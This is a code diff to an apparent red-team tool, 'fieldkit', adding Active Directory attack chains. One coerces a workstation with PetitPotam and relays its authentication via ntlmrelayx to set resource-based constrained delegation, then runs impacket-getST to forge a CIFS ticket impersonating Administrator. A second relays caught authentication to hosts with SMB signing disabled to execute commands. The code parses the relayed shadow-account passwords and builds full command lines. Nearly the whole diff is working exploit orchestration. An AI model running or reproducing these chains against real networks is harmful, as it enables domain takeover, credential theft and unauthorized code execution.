@@ -620,6 +620,13 @@ def _ensure_listener(chain, ctx):
     Called from BOTH _petitpotam_action (needs listener_uri) and
     _relay_listen_action (idempotent no-op if already spawned) so the
     chain step order stays flexible.
+
+    Profile-aware in D5: reads ``ctx.relay_mode`` (adcs-cert / ldap-rbcd
+    / smb-exec / socks) and ``ctx.relay_target`` (CA host for
+    adcs-cert; DC for ldap-rbcd; workstation for smb-exec) instead of
+    hardcoding esc8's shape. Backward-compat for D1-D4: when
+    relay_mode is missing but ctx.ca_endpoint IS set, fall back to
+    adcs-cert with ca_endpoint as the target (the esc8 path).
     """
     from . import relay as relay_mod
     listener = getattr(ctx, "_relay_listener", None)
@@ -630,17 +637,29 @@ def _ensure_listener(chain, ctx):
         return Outcome(
             kind="manual",
             evidence=("no listener_ip on ctx — run "
-                      "`fieldkit chain run esc8 <dc> --listener-ip <fieldkit-ip> "
-                      "--ca <ca-host>` to enable the relay listener"))
+                      "`fieldkit chain run <profile> <target> --listener-ip <fieldkit-ip> "
+                      "…` to enable the relay listener"))
+    # Profile-aware mode selection with backward-compat.
+    mode = getattr(ctx, "relay_mode", None)
+    relay_target = getattr(ctx, "relay_target", None)
     ca_endpoint = getattr(ctx, "ca_endpoint", None)
-    if not ca_endpoint:
+    if mode is None:
+        if ca_endpoint:
+            mode = "adcs-cert"
+            relay_target = ca_endpoint
+        else:
+            return Outcome(
+                kind="manual",
+                evidence=("no relay_mode or ca_endpoint on ctx — pass "
+                          "--ca <host> for esc8, --relay-target for rbcd/smb-relay"))
+    if not relay_target:
         return Outcome(
             kind="manual",
-            evidence=("no ca_endpoint on ctx — pass --ca <ca-host> for the "
-                      "esc8 ADCS relay target"))
+            evidence=(f"no relay_target on ctx for mode={mode!r} — the "
+                      f"listener needs a target service to relay to"))
     target = relay_mod.RelayTarget(
-        mode="adcs-cert",
-        target=ca_endpoint,
+        mode=mode,
+        target=relay_target,
         template=getattr(ctx, "template", "DomainController"))
     listener = relay_mod.start(
         target=target,
@@ -719,6 +738,185 @@ def _petitpotam_action(chain, ctx):
         }})
 
 
+# ---------------------------------------------------------------- rbcd + smb-relay steps
+
+def _rbcd_capture_action(chain, ctx):
+    """RBCD-mode variant of relay:capture. Polls ntlmrelayx stdout
+    for the "Delegation rights modified" line ntlmrelayx emits after
+    it writes msDS-AllowedToActOnBehalfOfOtherIdentity via the LDAPS
+    relay + --delegate-access flag. Records the "shadow" machine
+    account ntlmrelayx auto-adds so S4U2Self has a credential.
+
+    Custom poll loop (not :func:`wait_capture`) because the generic
+    classifier looks for cert/cred/fail signatures — the RBCD success
+    line matches none of them, so wait_capture would time out even on
+    a real success. The RBCD signature is distinct enough to poll for
+    directly.
+    """
+    import re as _re
+    import time as _time
+    listener = getattr(ctx, "_relay_listener", None)
+    if listener is None:
+        return Outcome(
+            kind="fail",
+            evidence="no relay listener attached to ctx — did relay:listen run?")
+    if not listener.tool_bin:
+        return Outcome(kind="manual",
+                        evidence="ntlmrelayx not on PATH — install `impacket-scripts`")
+    if not listener.listener_uri:
+        return Outcome(
+            kind="fail",
+            evidence="relay listener could not bind",
+            data={"relay_detail": "\n".join(listener.captured_lines[-20:])})
+    timeout = getattr(ctx, "relay_wait_capture", 60.0)
+    poll = getattr(ctx, "relay_poll_interval", 0.1)
+    deadline = _time.monotonic() + timeout
+    delegation_re = _re.compile(r"Delegation rights modified")
+    while _time.monotonic() < deadline:
+        text = "\n".join(listener.captured_lines)
+        if delegation_re.search(text):
+            break
+        # Distinguish "caught an auth but delegation write failed" from
+        # "no auth caught yet" — the auth-attempt line arrives first,
+        # then the delegation edit; if we see the auth-attempt and
+        # 3 seconds pass without a delegation line, treat as failure.
+        if listener.proc is not None and listener.proc.poll() is not None:
+            break
+        _time.sleep(poll)
+    listener.stop()
+    text = "\n".join(listener.captured_lines)
+    if not delegation_re.search(text):
+        if "Authenticating against" in text:
+            return Outcome(
+                kind="fail",
+                evidence="LDAPS relay caught an auth but delegation edit did not land",
+                data={"relay_detail": text[-1024:]})
+        return Outcome(
+            kind="fail",
+            evidence=f"relay saw no LDAPS auth in {timeout}s — coerce may have missed",
+            data={"relay_detail": text[-1024:]})
+    # Parse the shadow account ntlmrelayx creates: usually a
+    # ``[X$]`` machine account name + ``[Y]`` password.
+    m = _re.search(r"account\s+\[(\S+)\]\s+with password\s+\[([^\]]+)\]", text)
+    shadow_user = m.group(1) if m else ""
+    shadow_pass = m.group(2) if m else ""
+    # And the principal ntlmrelayx caught the auth from.
+    m = _re.search(r"Authenticating against\s+\S+\s+as\s+(\S+)", text)
+    caught_principal = m.group(1) if m else ""
+    return Outcome(
+        kind="ok",
+        evidence=f"RBCD ACL added on {chain.target} via {caught_principal or '?'};"
+                 f" shadow cred [{shadow_user}/{shadow_pass}]",
+        data={"rbcd_shadow_user": shadow_user,
+              "rbcd_shadow_pass": shadow_pass,
+              "rbcd_caught_principal": caught_principal,
+              "rbcd_target": chain.target})
+
+
+def _s4u2self_action(chain, ctx):
+    """Use the RBCD shadow credential to request a service ticket
+    impersonating a domain admin against the RBCD target's CIFS SPN.
+    Uses impacket-getST via runner.run.
+
+    Reads:
+      * chain.artifacts['rbcd_shadow_user'] / ['rbcd_shadow_pass']
+      * chain.artifacts['rbcd_target'] — the workstation the ACL edit landed on
+      * ctx.domain (required)
+      * ctx.impersonate (default 'Administrator') — the account to
+        impersonate via S4U2Self.
+    """
+    import shutil
+    from . import runner as runner_mod
+    shadow_user = chain.artifacts.get("rbcd_shadow_user", "")
+    shadow_pass = chain.artifacts.get("rbcd_shadow_pass", "")
+    target = chain.artifacts.get("rbcd_target", "")
+    domain = getattr(ctx, "domain", None)
+    impersonate = getattr(ctx, "impersonate", "Administrator")
+    if not (shadow_user and shadow_pass and target and domain):
+        return Outcome(
+            kind="fail",
+            evidence="s4u2self needs shadow cred + target + domain — rbcd:capture must have failed")
+    tool = getattr(ctx, "s4u2self_tool_bin", None) or shutil.which("impacket-getST")
+    if not tool:
+        hint = (f"impacket-getST -spn 'CIFS/{target}' "
+                f"-impersonate '{impersonate}' -dc-ip <dc> "
+                f"'{domain}/{shadow_user.rstrip('$')}$:{shadow_pass}'")
+        return Outcome(
+            kind="manual",
+            evidence=f"impacket-getST not on PATH; run:\n  {hint}")
+    argv = [
+        tool, "-spn", f"CIFS/{target}",
+        "-impersonate", impersonate,
+        "-dc-ip", getattr(ctx, "dc_ip", chain.target),
+        f"{domain}/{shadow_user.rstrip('$')}$:{shadow_pass}",
+    ]
+    result = runner_mod.run(argv, timeout=getattr(ctx, "s4u2self_timeout", 30))
+    if result.error and "not found" in result.error:
+        return Outcome(kind="manual",
+                        evidence=f"impacket-getST vanished before exec: {result.error}")
+    if result.timed_out:
+        return Outcome(kind="fail",
+                        evidence="s4u2self subprocess timed out",
+                        data={"detail": result.stdout + result.stderr})
+    output = result.stdout + result.stderr
+    if "Saving ticket in" in output:
+        # ticket path from output: "Saving ticket in Administrator@CIFS_target@DOMAIN.ccache"
+        import re as _re
+        m = _re.search(r"Saving ticket in\s+(\S+\.ccache)", output)
+        ccache_path = m.group(1) if m else ""
+        return Outcome(
+            kind="ok",
+            evidence=f"S4U2Self obtained CIFS/{target} ticket impersonating {impersonate}"
+                     + (f" → {ccache_path}" if ccache_path else ""),
+            data={"s4u2self_ccache": ccache_path,
+                  "s4u2self_impersonate": impersonate})
+    if "KDC_ERR" in output:
+        return Outcome(kind="fail",
+                        evidence="KDC rejected S4U2Self — RBCD ACL may not have landed",
+                        data={"detail": output[-512:]})
+    return Outcome(kind="fail",
+                    evidence="s4u2self ended in unrecognized state",
+                    data={"detail": output[-512:]})
+
+
+def _smb_relay_capture_action(chain, ctx):
+    """SMB-relay-exec variant of relay:capture. Waits for ntlmrelayx
+    to report a caught auth relayed to an SMB signing-disabled target.
+    ntlmrelayx by default drops a SOCKS session; we surface the caught
+    principal + any output ntlmrelayx executed.
+    """
+    from . import relay as relay_mod
+    listener = getattr(ctx, "_relay_listener", None)
+    if listener is None:
+        return Outcome(kind="fail",
+                        evidence="no relay listener attached — did relay:listen run?")
+    timeout = getattr(ctx, "relay_wait_capture", 60.0)
+    outcome = relay_mod.wait_capture(listener, timeout=timeout)
+    listener.stop()
+    if outcome.kind == "no-tool":
+        return Outcome(kind="manual",
+                        evidence="ntlmrelayx not on PATH")
+    if outcome.kind == "bind-fail":
+        return Outcome(kind="fail", evidence="relay listener could not bind")
+    if outcome.kind == "timeout":
+        return Outcome(kind="fail",
+                        evidence=f"no SMB auth caught in {timeout}s")
+    text = "\n".join(listener.captured_lines)
+    import re as _re
+    m = _re.search(r"Authenticating against\s+\S+\s+as\s+(\S+)", text)
+    principal = m.group(1) if m else ""
+    if outcome.kind not in ("cred-ok", "cert-ok"):
+        return Outcome(
+            kind="fail",
+            evidence=f"SMB relay caught an auth but exec did not land ({outcome.kind})",
+            data={"detail": text[-1024:]})
+    return Outcome(
+        kind="ok",
+        evidence=f"SMB relay landed against {chain.target} as {principal or '?'}",
+        data={"smb_relay_principal": principal,
+              "smb_relay_target": chain.target})
+
+
 # ---------------------------------------------------------------- esc8 profile
 
 @register("esc8")
@@ -761,5 +959,83 @@ def esc8_chain(target_dc, ca_endpoint=None, cred=None):
             Step("post:dcsync",
                  "attacker-side",
                  _dcsync_action,
+                 detection_cost=3),
+        ))
+
+
+# ---------------------------------------------------------------- rbcd profile
+
+@register("rbcd")
+def rbcd_chain(target_ws, dc_ip=None, cred=None):
+    """Resource-Based Constrained Delegation chain: coerce a workstation
+    to auth to fieldkit's LDAPS relay, ntlmrelayx writes
+    msDS-AllowedToActOnBehalfOfOtherIdentity for a shadow computer
+    account on the target, then S4U2Self produces a CIFS ticket
+    impersonating a domain admin against the workstation.
+
+    Requires: target workstation NOT in Protected Users group; DC
+    with LDAPS reachable from fieldkit; a coerce primitive that
+    works on the workstation (PetitPotam works on modern client
+    Windows too, since the MS-EFSR endpoint ships enabled).
+    """
+    _ = dc_ip, cred      # threaded through ctx by the CLI
+    return Chain(
+        profile="rbcd",
+        target=target_ws,
+        steps=(
+            REACHABILITY_STEP,
+            Step("coerce:petitpotam",
+                 "target-side",
+                 _petitpotam_action,
+                 detection_cost=3),
+            Step("relay:listen",
+                 "attacker-side",
+                 _relay_listen_action,
+                 detection_cost=1),
+            Step("relay:capture",
+                 "attacker-side",
+                 _rbcd_capture_action,
+                 detection_cost=3),
+            Step("post:s4u2self",
+                 "attacker-side",
+                 _s4u2self_action,
+                 detection_cost=1),
+        ))
+
+
+# ---------------------------------------------------------------- smb-relay-exec profile
+
+@register("smb-relay-exec")
+def smb_relay_exec_chain(target_smb, secondary_target=None, cred=None):
+    """Coerce a host, relay the caught auth to a SECOND host that has
+    SMB signing disabled, land command execution there.
+
+    Two distinct targets: ``target_smb`` is the host being coerced
+    (the auth source); the RELAY target lives on ``ctx.relay_target``
+    (must be different from the coerced host — you can't relay a
+    host's own auth back to itself). ntlmrelayx does the exec
+    directly via its default SMB attack.
+
+    Requires: SMB signing DISABLED on the relay target (this is the
+    load-bearing precondition; scan with `nxc smb <ip> --gen-relay-list`
+    beforehand).
+    """
+    _ = secondary_target, cred
+    return Chain(
+        profile="smb-relay-exec",
+        target=target_smb,
+        steps=(
+            REACHABILITY_STEP,
+            Step("coerce:petitpotam",
+                 "target-side",
+                 _petitpotam_action,
+                 detection_cost=3),
+            Step("relay:listen",
+                 "attacker-side",
+                 _relay_listen_action,
+                 detection_cost=1),
+            Step("relay:capture",
+                 "attacker-side",
+                 _smb_relay_capture_action,
                  detection_cost=3),
         ))
